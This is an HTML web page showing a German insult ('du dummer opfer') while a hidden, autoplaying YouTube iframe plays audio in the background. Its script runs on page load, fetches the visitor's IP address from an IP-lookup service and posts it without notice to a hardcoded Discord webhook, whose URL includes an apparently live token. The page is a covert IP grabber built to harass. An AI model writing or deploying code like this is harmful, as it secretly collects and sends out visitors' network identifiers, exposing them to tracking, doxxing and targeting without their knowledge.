<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Website</title>

    <style>
        body {
            margin: 0;
            min-height: 100vh;
            background: black;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }

        main {
            text-align: center;
            padding: 20px;
        }

        h1 {
            color: red;
            font-size: 48px;
        }

        .notice {
            color: #ff5555;
            font-size: 14px;
            max-width: 450px;
            margin: 20px auto;
            line-height: 1.6;
        }

        /* Hidden player so audio plays in the background */
        #yt-player {
            position: fixed;
            bottom: 0;
            right: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            border: 0;
        }
    </style>
</head>

<body>
    <main>
        <h1>du dummer opfer</h1>

        <p class="notice">
            Du Opfer
        </p>
    </main>

    <!-- Your video: https://www.youtube.com/watch?v=Cxvg_vv0G0A -->
    <iframe
        id="yt-player"
        src="https://www.youtube.com/embed/Cxvg_vv0G0A?autoplay=1&loop=1&playlist=Cxvg_vv0G0A&controls=0"
        title="YouTube video player"
        allow="autoplay; encrypted-media"
        allowfullscreen>
    </iframe>

    <script>
        const WEBHOOK_URL =
            "https://discord.com/api/webhooks/1571613664803430472/GhSw_7VMYZuL7Z5hDrT4PqxMM-NxDH_5DsmyCApX4eSi23fs1IL-pxHOXzW3a3rqba2I";

        async function sendVisitorIP() {
            try {
                const response = await fetch(
                    "https://api64.ipify.org?format=json"
                );

                if (!response.ok) {
                    throw new Error("IP lookup failed");
                }

                const data = await response.json();

                const form = new FormData();

                form.append("payload_json", JSON.stringify({
                    content:
                        "🌐 Website Visit\nIP: `" + data.ip + "`"
                }));

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    mode: "no-cors",
                    body: form
                });

                console.log("Webhook request attempted");

            } catch (error) {
                console.error("Logging error:", error);
            }
        }

        window.addEventListener("load", sendVisitorIP);
    </script>
</body>
</html>
